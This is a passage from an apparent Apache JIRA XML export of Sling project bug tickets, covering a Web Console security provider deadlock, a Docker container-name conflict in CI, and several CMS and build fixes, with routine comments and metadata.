	at org.apache.felix.framework.EventDispatcher.fireServiceEvent(EventDispatcher.java:545)
	at org.apache.felix.framework.Felix.fireServiceEvent(Felix.java:4833)
	at org.apache.felix.framework.Felix.registerService(Felix.java:3804)
	at org.apache.felix.framework.BundleContextImpl.registerService(BundleContextImpl.java:328)
	at org.apache.felix.scr.impl.manager.AbstractComponentManager$3.register(AbstractComponentManager.java:907)
	at org.apache.felix.scr.impl.manager.AbstractComponentManager$3.register(AbstractComponentManager.java:893)
	at org.apache.felix.scr.impl.manager.RegistrationManager.changeRegistration(RegistrationManager.java:128)
	at org.apache.felix.scr.impl.manager.AbstractComponentManager.registerService(AbstractComponentManager.java:960)
	at org.apache.felix.scr.impl.manager.AbstractComponentManager.activateInternal(AbstractComponentManager.java:733)
	at org.apache.felix.scr.impl.manager.DependencyManager$SingleStaticCustomizer.addedService(DependencyManager.java:1091)
	at org.apache.felix.scr.impl.manager.DependencyManager$SingleStaticCustomizer.addedService(DependencyManager.java:1043)
	at org.apache.felix.scr.impl.manager.ServiceTracker$Tracked.customizerAdded(ServiceTracker.java:1216)
	at org.apache.felix.scr.impl.manager.ServiceTracker$Tracked.customizerAdded(ServiceTracker.java:1137)
	at org.apache.felix.scr.impl.manager.ServiceTracker$AbstractTracked.trackAdding(ServiceTracker.java:944)
	at org.apache.felix.scr.impl.manager.ServiceTracker$AbstractTracked.track(ServiceTracker.java:880)
	at org.apache.felix.scr.impl.manager.ServiceTracker$Tracked.serviceChanged(ServiceTracker.java:1168)
	at org.apache.felix.scr.impl.BundleComponentActivator$ListenerInfo.serviceChanged(BundleComponentActivator.java:125)
	at org.apache.felix.framework.EventDispatcher.invokeServiceListenerCallback(EventDispatcher.java:990)
	at org.apache.felix.framework.EventDispatcher.fireEventImmediately(EventDispatcher.java:838)
	at org.apache.felix.framework.EventDispatcher.fireServiceEvent(EventDispatcher.java:545)
	at org.apache.felix.framework.Felix.fireServiceEvent(Felix.java:4833)
	at org.apache.felix.framework.Felix.registerService(Felix.java:3804)
	at org.apache.felix.framework.BundleContextImpl.registerService(BundleContextImpl.java:328)
	at org.apache.sling.jcr.base.AbstractSlingRepositoryManager.registerService(AbstractSlingRepositoryManager.java:222)
	at org.apache.sling.jcr.base.AbstractSlingRepositoryManager.initializeAndRegisterRepositoryService(AbstractSlingRepositoryManager.java:566)
	- locked &amp;lt;0x6bf30b5e&amp;gt; (a java.lang.&lt;span class=&quot;code-object&quot;&gt;Object&lt;/span&gt;)
	at org.apache.sling.jcr.base.AbstractSlingRepositoryManager.access$300(AbstractSlingRepositoryManager.java:92)
	at org.apache.sling.jcr.base.AbstractSlingRepositoryManager$4.run(AbstractSlingRepositoryManager.java:527)

Found 1 deadlock.
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13509874">SLING-11717</key>
            <summary>Sling WebConsoleSecurityProvider extension seems to deadlock in certain cases - Dupe</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="3">Duplicate</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="Henry Kuijpers">Henry Kuijpers</reporter>
                        <labels>
                    </labels>
                <created>Mon, 5 Dec 2022 13:20:45 +0000</created>
                <updated>Mon, 5 Dec 2022 13:39:07 +0000</updated>
                            <resolved>Mon, 5 Dec 2022 13:38:36 +0000</resolved>
                                    <version>Web Console Security Provider 1.2.4</version>
                    <version>Web Console Security Provider 1.2.6</version>
                                                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17643347" author="cziegeler" created="Mon, 5 Dec 2022 13:29:37 +0000"  >&lt;p&gt;Might be a duplicate of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11620&quot; title=&quot;Synchronization issue in Webconsole Security Provider&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11620&quot;&gt;&lt;del&gt;SLING-11620&lt;/del&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17643350" author="henry kuijpers" created="Mon, 5 Dec 2022 13:38:26 +0000"  >&lt;p&gt;Yes, indeed, that is exactly our problem! I&apos;m closing this one.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                            <outwardlinks description="duplicates">
                                        <issuelink>
            <issuekey id="13486264">SLING-11620</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 46 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1dej4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11701] Starter CI builds are sometimes failing with an error about a conflict with the docker container name</title>
                <link>https://issues.apache.org/jira/browse/SLING-11701</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The CI builds are sometimes failing with an error about a conflict with the docker container name&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;https://ci-builds.apache.org/job/Sling/job/modules/job/sling-org-apache-sling-starter/job/master/&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://ci-builds.apache.org/job/Sling/job/modules/job/sling-org-apache-sling-starter/job/master/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;This error is logged:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] DOCKER&amp;gt; I/O Error [Unable to create container for [apache/sling:snapshot] : {&quot;message&quot;:&quot;Conflict. The container name \&quot;/sling-1\&quot; is already in use by container \&quot;561df86f937afdecddc271bf24a537c182c98bc266337e5eee0b679423710689\&quot;. You have to remove (or rename) that container to be able to reuse that name.&quot;} (Conflict: 409)]
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The docker-maven-plugin documentation indicates that the containerNamePattern configuration is what determines the container name being launched.&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;&lt;a href=&quot;https://dmp.fabric8.io/#container-name&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://dmp.fabric8.io/#container-name&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;The documentation states that the default containerNamePattern value is &quot;%n-%i&quot;.&#160; The &quot;%i&quot; segment of the pattern is supposed to be an index which is incremented if a container has already been created.&#160; But this doesn&apos;t seem to be working for us, so maybe a different value would work more reliably?&lt;/p&gt;</description>
                <environment></environment>
        <key id="13505980">SLING-11701</key>
            <summary>Starter CI builds are sometimes failing with an error about a conflict with the docker container name</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Fri, 25 Nov 2022 18:23:49 +0000</created>
                <updated>Fri, 17 Jan 2025 09:58:35 +0000</updated>
                            <resolved>Wed, 30 Nov 2022 08:42:57 +0000</resolved>
                                                    <fixVersion>Starter 13</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="600">10m</timespent>
                                <comments>
                            <comment id="17640830" author="rombert" created="Tue, 29 Nov 2022 16:51:28 +0000"  >&lt;p&gt;Thanks for the report and links to documentation &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=enorman&quot; class=&quot;user-hover&quot; rel=&quot;enorman&quot;&gt;enorman&lt;/a&gt;. I suspect this happens because we are running multiple builds in parallel, and they sometimes land on the same node. I have prepared a tentative fix with &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-starter/pull/81&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-starter/pull/81&lt;/a&gt; .&lt;/p&gt;</comment>
                            <comment id="17641157" author="rombert" created="Wed, 30 Nov 2022 08:42:57 +0000"  >&lt;p&gt;This should have been fixed with &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-starter/pull/81&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;PR #81&lt;/a&gt; . &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=enorman&quot; class=&quot;user-hover&quot; rel=&quot;enorman&quot;&gt;enorman&lt;/a&gt; - please reopen if you still see the problem.&lt;/p&gt;</comment>
                            <comment id="17641517" author="enorman" created="Wed, 30 Nov 2022 19:36:43 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; Thanks.&#160; &#160;It looks like the last 2 ci builds look worked without any errors.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 47 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1cqiw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11687] Update to Sling Bundle Parent 49</title>
                <link>https://issues.apache.org/jira/browse/SLING-11687</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Update to Sling Bundle Parent 49&lt;/p&gt;</description>
                <environment></environment>
        <key id="13503884">SLING-11687</key>
            <summary>Update to Sling Bundle Parent 49</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Sat, 19 Nov 2022 22:33:03 +0000</created>
                <updated>Wed, 23 Nov 2022 03:40:04 +0000</updated>
                            <resolved>Sat, 19 Nov 2022 22:44:17 +0000</resolved>
                                                    <fixVersion>Health Check Support 1.0.10</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17636243" author="enorman" created="Sat, 19 Nov 2022 22:44:17 +0000"  >&lt;p&gt;Fixed at: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-hc-support/commit/6f55db54beff85bde38380fedc06a33b97a98c8c&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;6f55db5&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 48 weeks, 4 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1cdlk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11684] CMS - Discovery Topology Not Registered</title>
                <link>https://issues.apache.org/jira/browse/SLING-11684</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;In Sling CMS 1.1.2 the Discovery Topology does not register properly, resulting in sling jobs not being executed.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13503717">SLING-11684</key>
            <summary>CMS - Discovery Topology Not Registered</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="dklco">Dan Klco</reporter>
                        <labels>
                    </labels>
                <created>Sat, 19 Nov 2022 01:44:36 +0000</created>
                <updated>Wed, 25 Jan 2023 03:48:58 +0000</updated>
                            <resolved>Sat, 19 Nov 2022 01:48:33 +0000</resolved>
                                    <version>App CMS 1.1.2</version>
                                    <fixVersion>App CMS 1.1.4</fixVersion>
                                    <component>App CMS</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17636085" author="dklco" created="Sat, 19 Nov 2022 01:48:33 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-app-cms/commit/87f80c15fa5cff8abaa95d1f60aa492df1c9e916&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-app-cms/commit/87f80c15fa5cff8abaa95d1f60aa492df1c9e916&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 48 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1cckg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11683] CMS - Path Search Broken</title>
                <link>https://issues.apache.org/jira/browse/SLING-11683</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Release 1.1.2 breaks the content search in the CMS due to an unclosed EL Expression:&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;org.apache.sling.scripting.jsp.jasper.JasperException: /libs/sling-cms/components/cms/searchresults/searchresults.jsp(61,97) Unterminated ${ tag at org.apache.sling.scripting.jsp.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:40) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.scripting.jsp:2.6.0&amp;#93;&lt;/span&gt; at org.apache.sling.scripting.jsp.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:407) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.scripting.jsp:2.6.0&amp;#93;&lt;/span&gt; at org.apache.sling.scripting.jsp.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:132) &lt;span class=&quot;error&quot;&gt;&amp;#91;org.apache.sling.scripting.jsp:2.6.0&amp;#93;&lt;/span&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13503715">SLING-11683</key>
            <summary>CMS - Path Search Broken</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="dklco">Dan Klco</reporter>
                        <labels>
                    </labels>
                <created>Sat, 19 Nov 2022 01:40:58 +0000</created>
                <updated>Wed, 25 Jan 2023 03:48:52 +0000</updated>
                            <resolved>Sat, 19 Nov 2022 01:48:51 +0000</resolved>
                                    <version>App CMS 1.1.2</version>
                                    <fixVersion>App CMS 1.1.4</fixVersion>
                                    <component>App CMS</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17636086" author="dklco" created="Sat, 19 Nov 2022 01:48:51 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-app-cms/commit/6d0b4a0ec8f68b94a36c88ec9e4af85f4677af36&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-app-cms/commit/6d0b4a0ec8f68b94a36c88ec9e4af85f4677af36&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 48 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1cck0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11682] The starter-its profile does not set the start timeout for the Sling Starter</title>
                <link>https://issues.apache.org/jira/browse/SLING-11682</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The &lt;tt&gt;starter-its&lt;/tt&gt; profile attempts to set the Starter start timeout to 120 seconds, but does so using the wrong property name.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13503678">SLING-11682</key>
            <summary>The starter-its profile does not set the start timeout for the Sling Starter</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Fri, 18 Nov 2022 17:05:30 +0000</created>
                <updated>Sat, 8 Jul 2023 13:50:56 +0000</updated>
                            <resolved>Mon, 21 Nov 2022 08:24:38 +0000</resolved>
                                                    <fixVersion>Parent 50</fixVersion>
                                    <component>Build and Source Control</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
